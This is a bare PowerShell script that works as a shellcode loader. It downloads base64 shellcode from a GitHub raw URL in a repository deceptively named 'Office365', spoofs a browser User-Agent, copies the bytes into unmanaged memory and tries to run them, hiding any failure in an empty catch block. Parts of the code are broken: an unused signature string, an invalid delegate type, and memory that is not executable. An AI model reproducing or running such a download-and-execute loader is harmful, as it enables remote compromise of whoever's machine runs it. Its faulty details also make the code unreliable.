try {
    $url = "https://raw.githubusercontent.com/wolfgangphelan994924/Office365/main/shellcode_b64.txt"
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $b64 = $wc.DownloadString($url).Trim()
    $bytes = [Convert]::FromBase64String($b64)
    $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
    $sig = "delegate* unmanaged void()"
    $fn = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, [System.Func[]])
    $fn.Invoke()
} catch {}